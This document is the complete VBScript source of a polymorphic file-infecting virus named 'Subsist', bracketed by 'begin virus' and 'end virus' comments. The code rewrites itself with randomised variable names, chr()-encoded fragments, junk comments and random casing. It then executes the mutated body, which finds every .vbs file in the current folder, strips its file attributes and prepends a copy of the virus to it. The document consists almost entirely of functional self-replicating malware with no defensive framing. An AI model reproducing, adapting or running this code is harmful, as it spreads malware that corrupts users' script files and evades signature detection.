'Subsist - roy g biv 10/3/10
varvirclr=createobject("scripting.filesystemobject").opentextfile("subsist.vbs").readall:virb=instr(varvirclr,"var"+"all"):varvirclr=replace(replace(mid(varvirclr,virb,instr(virb,varvirclr,vbcrlf+"rem")-virb),"if 0then",""),"end if'0"+vbcrlf,"")
rem begin virus
varall=array("varall","vartind1","vartind2","vartval1","vartval2","vartstr1","vartstr2","varind1","varind2","varind3","varfragc","varfrag","varptype","varmode","varsname","varname","varename","varefrag","varatype","varbody","varpmode","varsel","varltr","varnum","varstr","procrandspc","procbool","procrandname","procrandcomm","procrandcomms","procrandcase","procrandcont"):randomize:for vartval1=0to ubound(varall):varvirclr=replace(varvirclr,varall(vartval1),procrandname):next:dim varfrag():vartstr1=varvirclr:do:vartval1=int(rnd*20)+20:if vartval1>len(vartstr1)then vartval1=len(vartstr1):end if:redim preserve varfrag(varfragc+1):varfrag(varfragc)=vartval1:varfragc=varfragc+1:vartstr1=mid(vartstr1,vartval1+1):loop while len(vartstr1):dim varptype():redim varptype(varfragc):dim varmode():redim varmode(varfragc):dim varsname():redim varsname(varfragc):dim varname():redim varname(varfragc+1):dim varename():redim varename(varfragc+1):for varind1=0to varfragc:varptype(varind1)=procbool:varmode(varind1)=int(rnd*varptype(varind1)*2):varsname(varind1)=procrandname:varname(varind1+1)=procrandname:if varmode(varind1)then varename(varind1+1)=1:if varind1 then if varmode(varind1-1)then varname(varind1+1)=varname(varind1):end if:end if:end if:next:varvirclr=replace(varvirclr,"varvirclr",varname(varfragc)):for varind1=0to varfragc:vartval1=varfrag(varind1):varfrag(varind1)="":for vartind2=1to vartval1:varfrag(varind1)=varfrag(varind1)+"+"+procrandspc+procrandcase("chr")+procrandspc+"("+procrandspc+cstr(asc(mid(varvirclr,vartind2,1)))+procrandspc+")"+procrandspc:next:varfrag(varind1)=procrandcont(mid(varfrag(varind1),2)):varvirclr=mid(varvirclr,vartval1+1):next:varname(0)=procrandname:dim varefrag():redim varefrag(varfragc):varatype=array("sub","function"):do:if procbool then varind1=int(rnd*(varfragc+1)):if varename(varind1)=0then varename(varind1)=1:varbody=varbody+vbcrlf+procrandcase(varname(varind1))+procrandspc+"="+procrandspc+chr(34)+chr(34)+procrandcomms:varpmode=0:end if:end if:varind1=int(rnd*varfragc):if varefrag(varind1)=0then varefrag(varind1)=1:varpmode=varatype(varptype(varind1)):varbody=varbody+vbcrlf+procrandspc+procrandcase(varpmode)+procrandspc+varsname(varind1)+procrandcomm(0):if varmode(varind1)then varbody=varbody+varsname(varind1)+procrandspc+"="+procrandspc:else varbody=varbody+procrandcase(varname(varind1+1))+procrandspc+"="+procrandspc+procrandcase(varname(varind1))+procrandspc+"+"+procrandspc:end if:varbody=varbody+varfrag(varind1)+procrandcomms+procrandcase("end")+procrandspc+procrandcase(varpmode)+procrandcomms:varind2=varind2+1:varpmode=0:end if:if varind3<varfragc and varename(varind3)and (varmode(varind3)or varename(varind3+1))and procbool then if varmode(varind3)then if varpmode then varpmode=procbool:if varpmode=0then varbody=varbody+procrandcomm(0):end if:end if:if varpmode=0then varpmode=1:varbody=varbody+procrandcase(varname(varind3+1))+procrandspc+"="+procrandspc+procrandcase(varname(varind3)):end if:varbody=varbody+procrandspc+"+"+procrandspc:else if varpmode then varbody=varbody+procrandcomm(0):varpmode=0:end if:end if:varbody=varbody+varsname(varind3)+procrandspc:if varmode(varind3)=0then varbody=varbody+procrandcomm(0):end if:varind3=varind3+1:end if:loop while varind2<varfragc or varind3<varfragc:varbody=varbody+procrandcomm(0)+procrandcase("execute")+procrandspc+procrandcase(varname(varfragc))+procrandcomms:if 0then on error resume next:set varind1=createobject("scripting.filesystemobject"):set vartind1=varind1.getfolder("."):for each vartind2 in vartind1.files:if lcase(varind1.getextensionname(vartind2))="vbs"then err.clear:set varind2=varind1.opentextfile(vartind2):if err.number=0then vartstr1=varind2.read(1):if vartstr1<>"'"then vartstr2=varind2.readall:vartval1=vartind2.attributes:vartind2.attributes=0:err.clear:set varind3=varind1.opentextfile(vartind2,2):if err.number=0then varind3.write "'Subsist - roy g biv 10/3/10"+vbcrlf+varbody+vartstr1+vartstr2:varind3.close:end if:vartind2.attributes=vartval1:end if:varind2.close:end if:end if:next:end if'0
function procrandspc:procrandspc=string(int(rnd*5)+1," ")end function:function procrandcomm(varsel)vartstr1="":for vartind1=0to int(rnd*5):if procbool then vartstr2="'":if varsel then procrandcase("rem")end if:vartstr1=vartstr1+procrandspc+vartstr2+procrandspc:varsel=procbool:for vartind2=0to int(rnd*5):vartstr1=vartstr1+chr(int(rnd*95)+32):next:end if:vartstr1=vartstr1+procrandspc+vbcrlf+procrandspc:next:procrandcomm=vartstr1:end function:function procbool:procbool=int(rnd*2)end function:function procrandname:vartstr1="":varltr=1:varnum=0:for vartind1=0to 8:vartstr1=vartstr1+chr((int(rnd*26)+procbool*32+65)*varltr+(int(rnd*10)+48)*varnum):varltr=procbool:varnum=varltr xor 1:next:procrandname=vartstr1:end function:function procrandcomms:procrandcomms=procrandcomm(procbool)end function:function procrandcase(varstr)vartstr2="":for vartind1=1to len(varstr):vartval2=asc(mid(varstr,vartind1,1)):vartstr2=vartstr2+chr(vartval2+procbool*32*(vartval2>96)):next:procrandcase=vartstr2:end function:function procrandcont(varstr)vartstr1="":do:varind2=instr(varstr,"+"):if varind2 then vartstr1=vartstr1+left(varstr,varind2):if int(rnd*10)=0then vartstr1=vartstr1+"_"+vbcrlf:end if:varstr=mid(varstr,varind2+1)end if:loop while varind2:procrandcont=vartstr1+varstr:end function
rem end virus
execute varbody